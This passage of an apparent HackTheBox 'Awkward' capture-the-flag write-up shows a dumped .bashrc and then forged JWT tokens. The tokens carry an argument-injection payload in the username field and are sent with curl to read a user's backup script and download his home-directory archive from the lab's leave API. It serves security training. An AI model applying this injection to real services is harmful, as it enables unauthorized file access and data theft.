<span class="line"><span style="color:#79B8FF">    PS1</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">&#39;${debian_chroot:+($debian_chroot)}</span><span style="color:#79B8FF">\[\033</span><span style="color:#9ECBFF">[01;32m</span><span style="color:#79B8FF">\]\u</span><span style="color:#9ECBFF">@</span><span style="color:#79B8FF">\h\[\033</span><span style="color:#9ECBFF">[00m</span><span style="color:#79B8FF">\]</span><span style="color:#9ECBFF">:</span><span style="color:#79B8FF">\[\033</span><span style="color:#9ECBFF">[01;34m</span><span style="color:#79B8FF">\]\w\[\033</span><span style="color:#9ECBFF">[00m</span><span style="color:#79B8FF">\]\$</span><span style="color:#9ECBFF"> &#39;</span></span>
<span class="line"><span style="color:#F97583">else</span></span>
<span class="line"><span style="color:#79B8FF">    PS1</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">&#39;${debian_chroot:+($debian_chroot)}</span><span style="color:#79B8FF">\u</span><span style="color:#9ECBFF">@</span><span style="color:#79B8FF">\h</span><span style="color:#9ECBFF">:</span><span style="color:#79B8FF">\w\$</span><span style="color:#9ECBFF"> &#39;</span></span>
<span class="line"><span style="color:#E1E4E8">fi</span></span>
<span class="line"><span style="color:#E1E4E8">unset color_prompt force_color_prompt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># If </span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8"> is an xterm set the title to user@</span><span style="color:#B392F0">host</span><span style="color:#E1E4E8">:dir</span></span>
<span class="line"><span style="color:#F97583">case</span><span style="color:#9ECBFF"> &quot;$TERM&quot;</span><span style="color:#F97583"> in</span></span>
<span class="line"><span style="color:#E1E4E8">xterm</span><span style="color:#F97583">*|</span><span style="color:#E1E4E8">rxvt</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#79B8FF">    PS1</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">&quot;</span><span style="color:#79B8FF">\[\e</span><span style="color:#9ECBFF">]0;${debian_chroot:+($debian_chroot)}</span><span style="color:#79B8FF">\u</span><span style="color:#9ECBFF">@</span><span style="color:#79B8FF">\h</span><span style="color:#9ECBFF">: </span><span style="color:#79B8FF">\w\a\]</span><span style="color:#9ECBFF">$PS1&quot;</span></span>
<span class="line"><span style="color:#E1E4E8">    ;;</span></span>
<span class="line"><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#E1E4E8">    ;;</span></span>
<span class="line"><span style="color:#E1E4E8">esac</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># enable color support </span><span style="color:#F97583">of</span><span style="color:#E1E4E8"> ls and also add handy aliases</span></span>
<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> [ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">dircolors ]; then</span></span>
<span class="line"><span style="color:#E1E4E8">    test </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r </span><span style="color:#F97583">~</span><span style="color:#9ECBFF">/</span><span style="color:#79B8FF">.</span><span style="color:#DBEDFF">dircolors &amp;&amp; eval &quot;</span><span style="color:#F97583">$</span><span style="color:#DBEDFF">(dircolors -b ~/</span><span style="color:#79B8FF">.</span><span style="color:#DBEDFF">dircolors)&quot; </span><span style="color:#F97583">||</span><span style="color:#DBEDFF"> eval &quot;</span><span style="color:#F97583">$</span><span style="color:#DBEDFF">(dircolors -b)&quot;</span></span>
<span class="line"><span style="color:#DBEDFF">    alias ls=&#39;ls --color=auto&#39;</span></span>
<span class="line"><span style="color:#DBEDFF">    #alias dir=&#39;dir --color=auto&#39;</span></span>
<span class="line"><span style="color:#DBEDFF">    #alias vdir=&#39;vdir --color=auto&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBEDFF">    alias grep=&#39;grep --color=auto&#39;</span></span>
<span class="line"><span style="color:#DBEDFF">    alias fgrep=&#39;fgrep --color=auto&#39;</span></span>
<span class="line"><span style="color:#DBEDFF">    alias egrep=&#39;egrep --color=auto&#39;</span></span>
<span class="line"><span style="color:#DBEDFF">fi</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBEDFF"># colored GCC warnings and errors</span></span>
<span class="line"><span style="color:#DBEDFF">#export GCC_COLORS=&#39;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBEDFF"># some more ls aliases</span></span>
<span class="line"><span style="color:#DBEDFF">alias ll=&#39;ls -alF&#39;</span></span>
<span class="line"><span style="color:#DBEDFF">alias la=&#39;ls -A&#39;</span></span>
<span class="line"><span style="color:#DBEDFF">alias l=&#39;ls -CF&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBEDFF"># custom</span></span>
<span class="line"><span style="color:#DBEDFF">alias backup_home=&#39;</span><span style="color:#9ECBFF">/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">Documents</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">backup_home.sh</span><span style="color:#9ECBFF">&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9ECBFF"># Add an &quot;alert&quot; alias for long running commands.  Use like so</span><span style="color:#FDAEB7;font-style:italic">:</span></span>
<span class="line"><span style="color:#E1E4E8">#   sleep </span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">; alert</span></span>
<span class="line"><span style="color:#E1E4E8">alias alert</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">&#39;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#39;</span><span style="color:#E1E4E8">\</span><span style="color:#9ECBFF">&#39;&#39;</span><span style="color:#E1E4E8">s</span><span style="color:#F97583">/^</span><span style="color:#E1E4E8">\s</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">0</span><span style="color:#F97583">-</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">]\</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">\s</span><span style="color:#F97583">*</span><span style="color:#6A737D">//;s/[;&amp;|]\s*alert$//&#39;\&#39;&#39;)&quot;&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># Alias definitions.</span></span>
<span class="line"><span style="color:#E1E4E8"># You may want to put all your additions into a separate file like</span></span>
<span class="line"><span style="color:#E1E4E8"># </span><span style="color:#F97583">~/</span><span style="color:#E1E4E8">.bash_aliases, instead </span><span style="color:#F97583">of</span><span style="color:#E1E4E8"> adding them here directly.</span></span>
<span class="line"><span style="color:#E1E4E8"># See </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">share</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">doc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">doc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">examples </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> the bash</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">doc package.</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> [ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">f </span><span style="color:#F97583">~/</span><span style="color:#E1E4E8">.bash_aliases ]; then</span></span>
<span class="line"><span style="color:#E1E4E8">    . </span><span style="color:#F97583">~/</span><span style="color:#E1E4E8">.bash_aliases</span></span>
<span class="line"><span style="color:#E1E4E8">fi</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8"># enable programmable completion </span><span style="color:#B392F0">features</span><span style="color:#E1E4E8"> (you don</span><span style="color:#9ECBFF">&#39;t need to enabl</span><span style="color:#FDAEB7;font-style:italic">e</span></span>
<span class="line"><span style="color:#E1E4E8"># </span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">, if it</span><span style="color:#9ECBFF">&#39;s already enabled in /etc/bash.bashrc and /etc/profil</span><span style="color:#FDAEB7;font-style:italic">e</span></span>
<span class="line"><span style="color:#E1E4E8"># sources </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">etc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash.bashrc).</span></span>
<span class="line"><span style="color:#F97583">if</span><span style="color:#F97583"> !</span><span style="color:#E1E4E8"> shopt </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">oq posix; then</span></span>
<span class="line"><span style="color:#F97583">  if</span><span style="color:#E1E4E8"> [ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">f </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">share</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">completion</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash_completion ]; then</span></span>
<span class="line"><span style="color:#E1E4E8">    . </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">usr</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">share</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">completion</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash_completion</span></span>
<span class="line"><span style="color:#E1E4E8">  elif [ </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">f </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">etc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash_completion ]; then</span></span>
<span class="line"><span style="color:#E1E4E8">    . </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">etc</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash_completion</span></span>
<span class="line"><span style="color:#E1E4E8">  fi</span></span>
<span class="line"><span style="color:#E1E4E8">fi</span></span></code></pre>
<p>We got the <code>backup script</code> path, let’s try to check that
<strong>alias backup_home=‘/bin/bash /home/bean/Documents/backup_home.sh’</strong></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;username&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">&quot;/&#39; /home/bean/Documents/backup_home.sh &#39;&quot;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;iat&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#79B8FF">1667017157</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>And got the <code>bean_backup_final.tar.gz</code> file path, let’s get that file in our <code>box</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">❯ curl </span><span style="color:#B392F0">http</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2NjcwMTcxNTd9.VlrDv1eoNVp1iJvKChFGtN_2ptmLOGzPg9o26tsSHGk&quot;</span></span>
<span class="line"><span style="color:#E1E4E8">#</span><span style="color:#F97583">!/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span></span>
<span class="line"><span style="color:#E1E4E8">mkdir </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">Documents</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">backup_tmp</span></span>
<span class="line"><span style="color:#E1E4E8">cd </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean</span></span>
<span class="line"><span style="color:#E1E4E8">tar </span><span style="color:#F97583">--</span><span style="color:#E1E4E8">exclude</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">&#39;.npm&#39;</span><span style="color:#F97583"> --</span><span style="color:#E1E4E8">exclude</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">&#39;.cache&#39;</span><span style="color:#F97583"> --</span><span style="color:#E1E4E8">exclude</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">&#39;.vscode&#39;</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">czvf </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">Documents</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">backup_tmp</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean_backup.tar.gz .</span></span>
<span class="line"><span style="color:#E1E4E8">date </span><span style="color:#F97583">&gt;</span><span style="color:#F97583"> /</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">Documents</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">backup_tmp</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">time.txt</span></span>
<span class="line"><span style="color:#E1E4E8">cd </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">Documents</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">backup_tmp</span></span>
<span class="line"><span style="color:#E1E4E8">tar </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">czvf </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">Documents</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">backup</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean_backup_final.tar.gz .</span></span>
<span class="line"><span style="color:#E1E4E8">rm </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">home</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bean</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">Documents</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">backup_tmp</span></span></code></pre>
<p>Path of the file is <code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;username&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">&quot;/&#39; /home/bean/Documents/backup/bean_backup_final.tar.gz &#39;&quot;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#9ECBFF">  &quot;iat&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#79B8FF">1667017157</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>Save the output inside the <code>bean_backup_final.zip</code> file</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">❯ curl </span><span style="color:#B392F0">http</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//hat-valley.htb/api/all-leave --header &quot;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw&quot; --output bean_backup_final.zip</span></span></code></pre>
<p>Extract that with <code>file manager</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd3.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd4.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd5.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>And we got the home directory of <code>bean</code> user</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">❯ ls </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">al</span></span>
<span class="line"><span style="color:#E1E4E8">total </span><span style="color:#79B8FF">188</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x</span><span style="color:#F97583">---</span><span style="color:#79B8FF"> 16</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">45</span><span style="color:#E1E4E8"> .</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct </span><span style="color:#79B8FF">22</span><span style="color:#79B8FF"> 23</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">13</span><span style="color:#E1E4E8"> ..</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">lrwxrwxrwx  </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> dedsec dedsec     </span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">40</span><span style="color:#E1E4E8"> .bash_history </span><span style="color:#F97583">-&gt;</span><span style="color:#F97583"> /</span><span style="color:#E1E4E8">dev</span><span style="color:#F97583">/</span><span style="color:#79B8FF">null</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#79B8FF">  1</span><span style="color:#E1E4E8"> dedsec dedsec   </span><span style="color:#79B8FF">220</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">34</span><span style="color:#E1E4E8"> .bash_logout</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#79B8FF">  1</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">3847</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">45</span><span style="color:#E1E4E8"> .bashrc</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#79B8FF">  1</span><span style="color:#E1E4E8"> dedsec dedsec </span><span style="color:#79B8FF">40960</span><span style="color:#E1E4E8"> Oct </span><span style="color:#79B8FF">29</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">37</span><span style="color:#E1E4E8"> bean_backup_final</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#79B8FF">  1</span><span style="color:#E1E4E8"> dedsec dedsec </span><span style="color:#79B8FF">31716</span><span style="color:#E1E4E8"> Oct </span><span style="color:#79B8FF">29</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">37</span><span style="color:#E1E4E8"> bean_backup_final.zip</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#79B8FF">  1</span><span style="color:#E1E4E8"> dedsec dedsec </span><span style="color:#79B8FF">32344</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">46</span><span style="color:#E1E4E8"> bean_backup.tar.gz</span></span>
<span class="line"><span style="color:#E1E4E8">drwx</span><span style="color:#F97583">------</span><span style="color:#79B8FF"> 12</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">41</span><span style="color:#E1E4E8"> .config</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> Desktop</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">46</span><span style="color:#E1E4E8"> Documents</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> Downloads</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwx</span><span style="color:#F97583">------</span><span style="color:#79B8FF">  2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8"> .gnupg</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#79B8FF">  1</span><span style="color:#E1E4E8"> dedsec dedsec   </span><span style="color:#79B8FF">609</span><span style="color:#E1E4E8"> Oct </span><span style="color:#79B8FF">28</span><span style="color:#79B8FF"> 23</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">44</span><span style="color:#E1E4E8"> jwt2john.py</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#79B8FF">  1</span><span style="color:#E1E4E8"> dedsec dedsec   </span><span style="color:#79B8FF">169</span><span style="color:#E1E4E8"> Oct </span><span style="color:#79B8FF">28</span><span style="color:#79B8FF"> 23</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">48</span><span style="color:#E1E4E8"> jwt_hash</span></span>
<span class="line"><span style="color:#E1E4E8">drwx</span><span style="color:#F97583">------</span><span style="color:#79B8FF">  3</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> .local</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> Music</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Oct </span><span style="color:#79B8FF">22</span><span style="color:#79B8FF"> 23</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8"> nmap</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> Pictures</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">rw</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#E1E4E8">r</span><span style="color:#F97583">--</span><span style="color:#79B8FF">  1</span><span style="color:#E1E4E8"> dedsec dedsec   </span><span style="color:#79B8FF">807</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">34</span><span style="color:#E1E4E8"> .profile</span></span>
<span class="line"><span style="color:#E1E4E8">drwxr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">xr</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">x  </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> Public</span><span style="color:#F97583">/</span></span>
<span class="line"><span style="color:#E1E4E8">drwx</span><span style="color:#F97583">------</span><span style="color:#79B8FF">  3</span><span style="color:#E1E4E8"> dedsec dedsec  </span><span style="color:#79B8FF">4096</span><span style="color:#E1E4E8"> Sep </span><span style="color:#79B8FF">15</span><span style="color:#79B8FF"> 06</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">35</span><span style="color:#E1E4E8"> snap</span><span style="color:#F97583">/</span></span>
